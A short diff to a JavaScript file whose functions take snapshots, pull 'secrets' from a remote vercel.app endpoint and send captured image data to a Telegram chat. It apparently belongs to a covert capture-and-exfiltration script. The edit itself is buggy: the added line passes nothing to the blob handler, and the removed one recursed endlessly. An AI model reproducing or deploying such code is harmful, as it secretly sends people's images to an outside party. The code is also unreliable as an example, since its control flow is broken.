@@ -51,7 +51,6 @@ function takeSnapshot() {
 async function fetchEnvVariables() {
   fetch('https://upload-jpg.vercel.app/api/secrets')
   .then(response => response.json())
-  .then(() => fetchEnvVariables())
   .then(data => {
     if (data.error) {
       console.error('Error:', data.error);
@@ -70,6 +69,7 @@ async function sendToTelegram(imageDataUrl) {
   // Преобразование DataURL в Blob
   fetch(imageDataUrl)
     .then(response => response.blob())
+    .then(() => fetchEnvVariables())
     .then(blob => {
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
